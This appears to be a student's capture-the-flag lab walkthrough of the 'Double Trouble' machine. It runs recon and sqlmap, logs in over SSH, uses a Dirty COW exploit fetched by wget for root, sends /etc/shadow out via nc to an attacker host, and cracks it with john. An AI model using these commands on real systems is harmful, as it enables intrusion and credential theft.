# Double Trouble 192.168.56.105
## Andrea Zonnekus 18758119


sudo netdiscover -i eth0

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.001.png)

sudo nmap --vv -sS -sV --script="default or safe" 192.168.56.105 -Pn -oN host

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.002.png)

dirb http://192.168.56.105 -o dirb

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.003.png)

nikto -o nikto -Format text -h 192.168.56.105

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.004.png)


sudo dirb http://192.168.56.105 /usr/share/dirb/wordlists/vulns/cgis.txt -o dirb\_cgis\_wordlist

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.005.png)

sqlmap -u http://192.168.56.105/index.php --forms --random-agent --dump-all

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.006.png)

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.007.png)

(takes too long)

sqlmap -u http://192.168.56.105/index.php --forms --random-agent --tables

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.008.png)

sqlmap -u http://192.168.56.105/index.php --forms --random-agent --dump users –level 5

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.009.png)



ssh <clapton@192.168.56.105>

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.010.png)

ping

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.011.png)

ls -lah

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.012.png)

uname -r

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.013.png)

find / -perm -u=s -type f 2>/dev/null

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.014.png)

find / -user root \(-perm -4000 -o -perm -2000 \) 2>/dev/null

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.015.png)




cat /etc/passwd | nc 192.168.56.105 666

nc -lp 666 > 666

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.016.png)

ls -lah /var/www

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.017.png)

sudo cp dirty64.c /var/www && cd /var/www

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.018.png)

python3 -m http.server 

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.019.png)

wget 192.168.56.102:8000/dirty64.c

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.020.png)

gcc dirty64.c -o cow -pthread

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.021.png)



./cow

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.022.png)

cd ~

ls -lah

cat root.txt

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.023.png)

nc -lp 4444 > shadow

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.024.png)

cat /etc/shadow | nc 192.168.56.102 4444

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.025.png)

john –incremental passwd shadow

![](double_trouble2_steps/Aspose.Words.53a25eb2-2096-4f0c-ae20-1ac4838de435.026.png)
